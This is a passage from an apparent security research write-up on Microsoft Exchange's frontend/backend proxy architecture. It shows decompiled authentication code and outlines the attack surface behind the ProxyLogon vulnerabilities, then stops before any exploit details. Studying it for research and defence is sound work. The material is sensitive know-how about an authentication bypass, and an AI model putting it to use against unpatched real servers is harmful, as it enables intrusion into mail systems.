    &lt;span class=&quot;n&quot;&gt;serverRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConnectionGroupName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserHostAddress&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GccUtils&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetClientPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SharedHttpContextWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetWrapper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AuthBehavior&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AuthState&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AuthState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BackEndFullAuth&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;ShouldBackendRequestBeAnonymous&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpProxySettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TestBackEndSupportEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;  
    &lt;span class=&quot;p&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsNullOrEmpty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TestBackEndUrl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;serverRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConnectionGroupName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Unauthenticated&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;serverRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Authorization&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KerberosUtilities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GenerateKerberosAuthHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;serverRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TraceContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kerberosChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\KerberosUtilities.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GenerateKerberosAuthHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;traceContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AuthenticationContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authenticationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kerberosChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;authenticationContext&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AuthenticationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;HTTP/&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;authenticationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;InitializeForOutboundNegotiate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AuthenticationMechanism&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Kerberos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SecurityStatus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;securityStatus&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authenticationContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;NegotiateSecurityContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;@string&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Negotiate &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;@string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Therefore, a Client request proxied to the Backend will be added with several HTTP Headers for internal use. The two most essential Headers are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt;, which indicates the mail usersâ€™ log in identity, and Kerberos Ticket, which represents legal access from the Frontend.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;frontend-response-section&quot;&gt;Frontend Response Section&lt;/h3&gt;

&lt;p&gt;The last is the section of Response. It receives the response from the Backend and decides which headers or cookies are allowed to be sent back to the Frontend.&lt;/p&gt;

&lt;h2 id=&quot;backend-rehydration-module&quot;&gt;Backend Rehydration Module&lt;/h2&gt;

&lt;p&gt;Now letâ€™s move on and check  how the Backend processes the request from the Frontend. The Backend first uses the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IsAuthenticated&lt;/code&gt; to check whether the incoming request is authenticated. Then the Backend will verify whether the request is equipped with an extended right called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ms-Exch-EPI-Token-Serialization&lt;/code&gt;. With the default setting, only Exchange Machine Account would have such authorization. This is also why the Kerberos Ticket generated by the Frontend could pass the checkpoint but you canâ€™t access the Backend directly with a low authorized account.&lt;/p&gt;

&lt;p&gt;After passing the check, Exchange will restore the login identity used in the Frontend, through deserializing the header &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt; back to the original Access Token, and then put it in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;httpContext&lt;/code&gt; object to progress to the business logic in the Backend.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Authentication\BackendRehydrationModule.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnAuthenticateRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EventArgs&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsAuthenticated&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ProcessRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ProcessRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CommonAccessToken&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;TryGetCommonAccessToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;TryGetCommonAccessToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommonAccessToken&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-CommonAccessToken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsNullOrEmpty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsTokenSerializationAllowed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Identity&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WindowsIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;BEValidateCATRightsLatency&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stopwatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ElapsedMilliseconds&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elapsedMilliseconds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommonAccessToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;httpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Item-CommonAccessToken&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;//...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;IsTokenSerializationAllowed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WindowsIdentity&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;windowsIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;flag2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LocalServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;AllowsTokenSerializationBy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientSecurityContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AllowsTokenSerializationBy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientSecurityContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clientContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LocalServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;HasExtendedRightOnServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
        &lt;span class=&quot;n&quot;&gt;WellKnownGuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TokenSerializationRightGuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// ms-Exch-EPI-Token-Serialization&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;the-attack-surface&quot;&gt;The attack surface&lt;/h1&gt;

&lt;p&gt;After a brief introduction to the architecture of CAS, we now realize that CAS is just a well-written HTTP Proxy (or Client), and we know that implementing Proxy isnâ€™t easy.  So I was wondering:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Could I use a single HTTP request to access different contexts in Frontend and Backend respectively to cause some confusion?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If we could do that, maaaaaybe I could bypass some Frontend restrictions to access arbitrary Backends and abuse some internal API. Or, we can confuse the context to leverage the inconsistency of the definition of dangerous HTTP headers between the Frontend and Backend to do further interesting attacks.&lt;/p&gt;

&lt;p&gt;With these thoughts in mind, letâ€™s start hunting!&lt;/p&gt;

&lt;h1 id=&quot;the-proxylogon&quot;&gt;The ProxyLogon&lt;/h1&gt;

&lt;p&gt;The first exploit is the ProxyLogon. As introduced before, this may be the most severe vulnerability in the Exchange history ever. ProxyLogon is chained with 2 bugs:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855&quot;&gt;CVE-2021-26855&lt;/a&gt; - Pre-auth SSRF leads to Authentication Bypass&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065&quot;&gt;CVE-2021-27065&lt;/a&gt; - Post-auth Arbitrary-File-Write leads to RCE&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;cve-2021-26855---pre-auth-ssrf&quot;&gt;CVE-2021-26855 - Pre-auth SSRF&lt;/h2&gt;

